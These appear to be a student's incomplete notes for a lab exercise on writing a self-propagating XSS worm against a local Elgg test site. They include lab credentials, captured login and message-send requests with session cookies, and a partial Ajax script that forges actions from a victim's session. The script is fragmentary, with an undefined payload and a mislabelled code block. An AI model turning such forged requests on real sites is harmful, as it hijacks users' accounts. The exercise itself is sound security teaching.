# Writing Self-propagating XSS Worm

## Task 1
Using Account:

Username: Boby
Pass: seedboby

* Login Post data
```sh
curl 'http://www.xsslabelgg.com/action/login' -H 'Host: www.xsslabelgg.com' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://www.xsslabelgg.com/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: Elgg=cn6t026r72ceqv98uqk38cdci1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data ''
```

* Send Samy Message post data
```sh
curl 'http://www.xsslabelgg.com/action/messages/send' -H 'Host: www.xsslabelgg.com' -H '(user-agent): mozilla/5.0 (x11; ubuntu; linux i686; rv:60.0) gecko/20100101 firefox/60.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://www.xsslabelgg.com/messages/compose?send_to=47' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: Elgg=i0dbkkd1dcaf3qfmtn9gvmsae5' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data ''
```

```sh
//Create and send Ajax request to modify profile
var sendurl='http://www.xsslabelgg.com/action/messages/send'
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true)
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
// Ajax.setRequestHeader("User-Agent","(user-agent): mozilla/5.0 (x11; ubuntu; linux i686; rv:60.0) gecko/20100101 firefox/60.0");
// Ajax.setRequestHeader("Accept","Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
// Ajax.setRequestHeader("Cookie",""); // Do not put because the victim has this in their own session
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send(content);
```

### Goal
  * [ ] Send a message from victim’s profile to Samy with victim’s browser cookie.
  * [ ] Add Samy as a friend in the victims profile.

### Scripts


* [ ] Username: samy
* [ ] Pass: seedsamy

## Reference
http://www.xsslabelgg.com/

POST /action/login HTTP/1.1
Host: www.xsslabelgg.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.xsslabelgg.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Cookie: Elgg=b8vmk86qa8cf7u7sjsm50lfnk4
Connection: keep-alive
Upgrade-Insecure-Requests: 1
